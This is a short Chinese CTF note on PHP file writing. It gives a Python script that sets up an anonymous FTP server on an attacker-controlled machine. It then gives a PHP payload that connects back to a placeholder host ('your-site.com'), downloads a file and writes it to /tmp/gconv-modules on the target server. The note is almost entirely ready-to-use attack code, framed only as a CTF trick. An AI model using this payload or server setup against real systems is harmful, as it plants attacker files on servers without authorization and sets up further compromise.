tags:: CTFWEB/PHP/文件写入

- # 准备
	- pip安装pyftpdlib,创建一个main.py(内容如下)，然后在同级创建ftp文件夹，里面放你的文件
	- 然后，启动！
	- ```python
	  import os
	  from pyftpdlib import servers
	  from pyftpdlib.handlers import FTPHandler
	  from pyftpdlib.authorizers import DummyAuthorizer
	  
	  def run_ftp_server():
	      # 创建一个虚拟用户并设置密码和路径
	      authorizer = DummyAuthorizer()
	      authorizer.add_anonymous("./ftp/")
	  
	      # 实例化FTP处理程序并配置它
	      handler = FTPHandler
	      handler.passive_ports = range(3005, 3010)
	      handler.authorizer = authorizer
	  
	      # 配置服务器接口和端口
	      server = servers.FTPServer(("0.0.0.0", 3002), handler)
	  
	      # 开启服务器
	      server.serve_forever()
	  
	  run_ftp_server()
	  ```
- # 使用
	- 多汁的PHP payload
		- ```php
		  
		  $ftp_server = 'your-site.com';
		  $ftp_port = 3002;
		  $ftp = ftp_connect($ftp_server, $ftp_port);
		  
		  if (!$ftp) {
		      echo "无法连接到FTP服务器";
		      exit;
		  }
		  
		  $login = ftp_login($ftp, 'anonymous', '');
		  if (!$login) {
		      echo "登录FTP服务器失败";
		      exit;
		  }
		  
		  $local_file = '/tmp/gconv-modules'; # 目标地址
		  $server_file = 'gconv-modules'; # 服务器上的地址
		  
		  ftp_pasv($ftp, 1);
		  @unlink($server_file);
		  if (ftp_get($ftp, $local_file, $server_file, FTP_BINARY)) {
		      echo "文件成功下载到 $local_file ";
		  } else {
		      echo "下载文件失败";
		  }
		  
		  ftp_close($ftp);
		  
		  ```